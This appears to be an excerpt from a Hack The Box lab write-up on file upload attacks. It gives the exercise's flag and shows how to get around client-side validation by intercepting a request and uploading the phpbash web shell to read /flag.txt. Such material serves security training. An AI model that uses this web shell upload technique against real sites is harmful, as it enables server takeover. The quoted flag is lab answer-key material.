...
1. Try to bypass the client-side file type validations in the above exercise, then upload a web shell to read /flag.txt (try both bypass methods for better practice) **Answer: HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}**
   - First upload a normal `.jpg` file then capture the request and modify the file content to our [phpbash](https://github.com/Arrexel/phpbash/blob/master/phpbash.php) file:
        ...
        Host: 154.57.164.76:31744
        Content-Length: 11442
        X-Requested-With: XMLHttpRequest
        Accept-Language: en-US,en;q=0.9
        Accept: */*
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4ziVhu8IA6LkhRG6
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
        Origin: http://154.57.164.76:31744
        Referer: http://154.57.164.76:31744/
        Accept-Encoding: gzip, deflate, br
        Connection: keep-alive

        ------WebKitFormBoundary4ziVhu8IA6LkhRG6
        Content-Disposition: form-data; name="uploadFile"; filename="phpbash.php"
        ...
        ```
   - Visit the uploaded file at http://154.57.164.76:31744/profile_images/phpbash.php and read the flag